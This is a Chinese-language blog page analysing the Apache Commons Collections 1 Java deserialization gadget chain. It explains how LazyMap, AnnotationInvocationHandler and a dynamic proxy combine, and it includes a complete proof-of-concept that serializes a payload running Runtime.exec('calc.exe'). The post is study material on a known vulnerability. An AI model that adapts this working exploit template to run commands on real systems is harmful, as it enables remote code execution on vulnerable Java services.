@@ -1,0 +1,439 @@
+﻿<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="referrer" content="origin" />
+    <meta name="description" content="Java安全之Commons Collections1分析（三） 0x00 前言 继续来分析cc链，用了前面几篇文章来铺垫了一些知识。在上篇文章里，其实是硬看代码，并没有去调试。因为一直找不到JDK的" />
+    <meta property="og:description" content="Java安全之Commons Collections1分析（三） 0x00 前言 继续来分析cc链，用了前面几篇文章来铺垫了一些知识。在上篇文章里，其实是硬看代码，并没有去调试。因为一直找不到JDK的" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Java安全之Commons Collections1分析（三） - nice_0e3 - 博客园</title>
+    <link id="favicon" rel="shortcut icon" href="//common.cnblogs.com/favicon.svg" type="image/svg+xml" />
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=kXxbcm7tkkASG2_xwyD6Kw4CzHe0bT3mi0jyCb8YspQ" />
+    
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/nice0e3/custom.css?v=rpVRRg0n57gY&#x2B;Kw07PlwXX/emho=" />
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/skins/codinglife/bundle-codinglife-mobile.min.css?v=JtOonyglmq10yOLdtvmh-WsVtFwm8HRB8mR_g_TGArQ" />
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/nice0e3/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/nice0e3/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/nice0e3/wlwmanifest.xml" />
+    <script>
+        var currentBlogId = 592290;
+        var currentBlogApp = 'nice0e3';
+        var cb_enable_mathjax = false;
+        var isLogined = false;
+        var isBlogOwner = false;
+        var skinName = 'CodingLife';
+        var visitorUserId = '';
+    </script>
+        <script>
+            var currentPostDateAdded = '2020-10-11 05:16';
+        </script>
+    <script src="https://common.cnblogs.com/scripts/jquery-2.2.0.min.js"></script>
+    <script src="/js/blog-common.min.js?v=fLUEwRea4WeqlJe_CLnNunLQZl_ViJFLgKpcNDuKptI"></script>
+    
+    
+    
+</head>
+<body>
+    <a name="top"></a>
+    <div id="top_nav" class="navbar navbar-custom">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园"><img src="/images/logo.svg?v=R9M0WmLAIPVydmdzE2keuvnjl-bPR7_35oHqtiBzGsM" alt="博客园Logo" /></a>
+                </li>
+                <li><a href="/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-sitehome')">首页</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-news')">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-q')">博问</a></li>
+                <li><a id="nav_brandzone" href="https://brands.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-brands')">专区</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-ing')">闪存</a></li>
+                <li><a href="https://edu.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-edu')">班级</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search" action="https://zzk.cnblogs.com/s" method="get">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="text" tabindex="3" />
+                        <button type="submit" id="zzk_search_button">
+                            <img src="/images/aggsite/search.svg" alt="搜索" />
+                        </button>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx" alt="我的博客" title="我的博客">
+                        <img id="myblog_icon" class="navbar-icon" src="/images/aggsite/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息">
+                        <img id="msg_icon" class="navbar-icon" src="/images/aggsite/message.svg?v=oS4PkibyMjZ9rGD5XAcLt99uW_s76Javy2up4dbnZNY" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="/images/aggsite/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="javascript:void(0)" onclick="logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup/">注册</a>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signin/?returnUrl=https://www.cnblogs.com/">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    
+    
+<!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/nice0e3/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/nice0e3/">nice_0e3</a>
+</h1>
+<h2>
+理想与热爱
+</h2>
+
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/nice0e3/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/nice_0e3">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/nice0e3/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			
+			<span id="stats_post_count">随笔 - 
+77&nbsp; </span>
+<span id="stats_article_count">文章 - 
+0&nbsp; </span>
+<span id="stats-comment_count">评论 - 
+4</span>
+
+			
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    <!--done-->
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/nice0e3/p/13798371.html">
+    <span>Java安全之Commons Collections1分析（三）</span>
+    
+
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                
+<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+    <h1 id="java安全之commons-collections1分析（三）">Java安全之Commons Collections1分析（三）</h1>
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>继续来分析cc链，用了前面几篇文章来铺垫了一些知识。在上篇文章里，其实是硬看代码，并没有去调试。因为一直找不到JDK的低版本。 全靠脑子去记传参内容尝试理解。后面的其实就简单多了，在上篇文章的基础上再去做一个分析。</p>
+<p>​</p>
+<ol>
+<li>
+<p><a href="https://www.cnblogs.com/nice0e3/p/13772184.html">Java安全之URLDNS链</a></p>
+</li>
+<li>
+<p><a href="https://www.cnblogs.com/nice0e3/p/13758664.html">Java安全之Commons Collections1分析前置知识</a></p>
+</li>
+<li>
+<p><a href="https://www.cnblogs.com/nice0e3/p/13779857.html">Java安全之Commons Collections1分析（一）</a></p>
+</li>
+<li>
+<p><a href="https://www.cnblogs.com/nice0e3/p/13791793.html">Java安全之Commons Collections1分析（二）</a></p>
+</li>
+</ol>
+<h2 id="0x01--cc链的另一种构造方式">0x01  CC链的另一种构造方式</h2>
+<p>上篇文章说到使用<code>LazyMap</code> 的<code>get</code>方法也可以去触发命令执行。因为<code>LazyMap</code> 的<code>get</code>方法在</p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201011171313551-1903043082.png" alt="" loading="lazy"></p>
+<p>这里看到<code>this.factory</code>变量会去调用<code>transform</code>方法。前面也分析了该类构造方法是一个<code>protected</code>修饰的。不可被直接new。需要使用<code>decorate</code>工厂方法去提供。那么在前面我们调用该方法并传入<code>innerMap</code>和<code>transformerChain</code>参数。</p>
+<p>这里的innerMap是一个Map的对象，<code>transformerChain</code>是一个<code>ChainedTransformer</code>修饰过的<code>Transformer[]</code>数组。</p>
+<pre><code>Map tmpmap = LazyMap.decorate(innerMap, transformerChain);
+</code></pre>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201011171405476-156450859.png" alt="" loading="lazy"></p>
+<p>传入过后，<code>LazyMap</code> 的<code>get</code>方法方法里面的<code>this.factory</code>为<code>Transformer[]</code>数组，这时候去调用就会执行<code>transform</code>方法，而<code>ChainedTransformer</code>的<code>transform</code>方法又会去遍历调用<code>Transformer[]</code>里面的<code>transform</code>方法，导致使用方式的方式传入的<code>Runtime</code>调用了<code>exec</code>执行了<code>calc.exe</code>弹出一个计算器。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201011171420368-158996059.png" alt="" loading="lazy"></p>
+<p>当然在实际中，我们还需要借助其他的类去调用这个get方法。</p>
+<p>而在<code>AnnotationInvocationHandler</code>的<code>invoke</code>就会去调用<code>get</code>方法。</p>
+<pre><code> public Object invoke(Object var1, Method var2, Object[] var3) {
+        String var4 = var2.getName();
+        Class[] var5 = var2.getParameterTypes();
+        if (var4.equals("equals") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
+            return this.equalsImpl(var3[0]);
+        } else if (var5.length != 0) {
+            throw new AssertionError("Too many parameters for an annotation method");
+        } else {
+            byte var7 = -1;
+            switch(var4.hashCode()) {
+            case -1776922004:
+                if (var4.equals("toString")) {
+                    var7 = 0;
+                }
+                break;
+            case 147696667:
+                if (var4.equals("hashCode")) {
+                    var7 = 1;
+                }
+                break;
+            case 1444986633:
+                if (var4.equals("annotationType")) {
+                    var7 = 2;
+                }
+            }
+
+            switch(var7) {
+            case 0:
+                return this.toStringImpl();
+            case 1:
+                return this.hashCodeImpl();
+            case 2:
+                return this.type;
+            default:
+                Object var6 = this.memberValues.get(var4);
+                if (var6 == null) {
+                    throw new IncompleteAnnotationException(this.type, var4);
+                } else if (var6 instanceof ExceptionProxy) {
+                    throw ((ExceptionProxy)var6).generateException();
+                } else {
+                    if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) {
+                        var6 = this.cloneArray(var6);
+                    }
+
+                    return var6;
+                }
+</code></pre>
+<p>这里特地标出来</p>
+<pre><code>Object var6 = this.memberValues.get(var4);
+</code></pre>
+<p>前面说过 构造方法传入的是<code>transformerChain</code>，<code> this.memberValues=transformerChain</code> <code>this.memberValues</code> 是一个<code>ChainedTransformer</code>修饰过的<code>Transformer[]</code>数组。这时候调用<code>get</code>，<code>get</code>方法调用<code>transform</code>,又回到了刚刚的话题上了。</p>
+<p><code>AnnotationInvocationHandler</code>的<code>invoke</code>怎么去调用呢？</p>
+<p>在这里会使用到动态代理的方式去调用到该方法。关于动态代理可以参考该篇文章<a href="https://www.cnblogs.com/nice0e3/p/13562660.html">动态代理机制</a>。</p>
+<h2 id="0x02-动态代理">0x02 动态代理</h2>
+<p>关于动态代理，在这里其实还是有必要单独拿出来说一下动态代理这个机制。</p>
+<p>动态代理的实现：</p>
+<pre><code>Proxy.newProxyInstance(Person.class.getClassLoader(), Class&lt;?&gt;[]interfaces,InvocationHandler h)
+</code></pre>
+<ul>
+<li>
+<p>第一个参数：People.getClass().getClassLoader()，使用handler对象的<br>
+classloader对象来加载我们的代理对象</p>
+</li>
+<li>
+<p>第二个参数：Person.getClass().getInterfaces()，这里为代理类提供的接口  是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法</p>
+</li>
+<li>
+<p>第三个参数：我们将代理对象关联到上面的InvocationHandler对象上</p>
+</li>
+</ul>
+<h2 id="0x03-poc-分析">0x03 POC 分析</h2>
+<pre><code>public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+        Class clazz =
+                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class,
+                Map.class);
+        construct.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
+        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.txt"));
+        oos.writeObject(handler);
+        
+    }
+</code></pre>
+<p>主要是来看这一段代码</p>
+<pre><code>Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
+</code></pre>
+<p>这里的handler是反射创建的一个 <code>AnnotationInvocationHandler</code>类。而<code>AnnotationInvocationHandler</code>中实现了<code>InvocationHandler</code>接口，可以直接作为调用处理器传入。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201011171540413-687426309.png" alt="" loading="lazy"></p>
+<p>那么在这段poc的执行中执行反序列化的时候，<code>AnnotationInvocationHandler</code>重写了<code>readObject()</code>方法，所以调用的是<code>AnnotationInvocationHandler</code>的<code>readObject()</code>方法。<code>readObject()</code>方法会去调用memberValues的<code>entrySet()</code>方法。这里的<code>memberValues</code>是构造方法传入进来的参数，我们是使用反射的方式对他进行创建传入的是<code>proxyMap</code>。</p>
+<p>对应的代码：</p>
+<pre><code>Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
+        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
+</code></pre>
+<p>因为<code>proxyMap</code>是我们的代理对象，所以调用<code>proxyMap</code>的<code>entrySet()</code>会触发到<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法进行执行。这也是动态代理的一个特性，代理对象调用任意方法，调用处理器中的<code>invoke()</code>方法都执行一次。</p>
+<p>执行<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法后又会调用get方法，再次回到刚刚的地方了。</p>
+<p><code>LazyMap</code> 的<code>get</code>方法方法里面的<code>this.factory</code>为<code>Transformer[]</code>数组，这时候去调用就会执行<code>transform</code>方法，而<code>ChainedTransformer</code>的<code>transform</code>方法又会去遍历调用<code>Transformer[]</code>里面的<code>transform</code>方法，导致使用方式的方式传入的<code>Runtime</code>调用了<code>exec</code>执行了<code>calc.exe</code>弹出一个计算器。</p>
+<p>那么就刚好对应了前面标出来的一个利用链</p>
+<pre><code>Gadget chain:
+		ObjectInputStream.readObject()
+			AnnotationInvocationHandler.readObject()
+				Map(Proxy).entrySet()
+					AnnotationInvocationHandler.invoke()
+						LazyMap.get()
+							ChainedTransformer.transform()
+								ConstantTransformer.transform()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Class.getMethod()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.getRuntime()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.exec()
+
+</code></pre>
+<h2 id="0x04-结尾">0x04 结尾</h2>
+<p>在CC1这条链里面其实是有版本限制的，在高版本无法使用。因为<code>AnnotationInvocationHandler</code>的<code>readObject()</code>复写点这个地方在高版本中是进行了改动。在其他大佬测试中jdk1.7u21、jdk1.8_101、jdk1.8_171这几个版本是可用的。</p>
+
+</div>
+<div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date">2020-10-11 17:16</span>&nbsp;
+<a href="https://www.cnblogs.com/nice0e3/">nice_0e3</a>&nbsp;
+阅读(<span id="post_view_count">22</span>)&nbsp;
+评论(<span id="post_comment_count">2</span>)&nbsp;
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=13798371" rel="nofollow">编辑</a>&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(13798371);return false;">收藏</a></div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script src="https://common.cnblogs.com/highlight/9.12.0/highlight.min.js"></script>
+<script>markdown_highlight();</script>
+<script>
+    var allowComments = true, cb_blogId = 592290, cb_blogApp = 'nice0e3', cb_blogUserGuid = '2e2f5aaf-94f8-4be7-a83c-08d7d2f044e4';
+    var cb_entryId = 13798371, cb_entryCreatedDate = '2020-10-11 17:16', cb_postType = 1;
+    loadViewCount(cb_entryId);
+</script><a name="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<script>
+    var commentManager = new blogCommentManager();
+    commentManager.renderComments(0);
+</script>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+    <div id="ad_t2"></div>
+    <div id="opt_under_post"></div>
+    <div id="cnblogs_c1" class="c_ad_block">
+        <div id='div-gpt-ad-1592365906576-0' style='width: 300px; height: 250px;'></div>
+    </div>
+    <div id="under_post_news"></div>
+    <div id="cnblogs_c2" class="c_ad_block">
+        <div id='div-gpt-ad-1592366332455-0' style='width: 468px; height: 60px;'></div>
+    </div>
+    <div id="under_post_kb"></div>
+    <div id="HistoryToday" class="c_ad_block"></div>
+    <script type="text/javascript">
+        fixPostBody();
+        deliverBigBanner();
+setTimeout(function() { incrementViewCount(cb_entryId); }, 50);        deliverT2();
+        deliverC1C2();
+        loadNewsAndKb();
+        loadBlogSignature();
+LoadPostCategoriesTags(cb_blogId, cb_entryId);        LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+        GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+        loadOptUnderPost();
+        GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+    </script>
+</div>
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+<div id="sidebar_news" class="newsItem">
+            <script>loadBlogNews();</script>
+</div>
+
+<div id="sidebar_ad"></div>
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>
+			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+                    <script>loadBlogSideColumn();</script>
+			</div>
+			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		<!--done-->
+Copyright &copy; 2020 nice_0e3
+<br /><span id="poweredby">Powered by .NET Core on Kubernetes</span>
+
+
+
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+
+
+    <div id="page_end_html">
+        <div id="bottomProgressBar"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.0/dist/APlayer.min.css">
+<div id="aplayer" class="aplayer" data-id="316722029" data-lrctype="0" data-server="netease" data-type="playlist" data-fixed="true" data-listfolded="true"></div>
+<div id="rightMenu"></div>
+    </div>
+</body>
+</html>
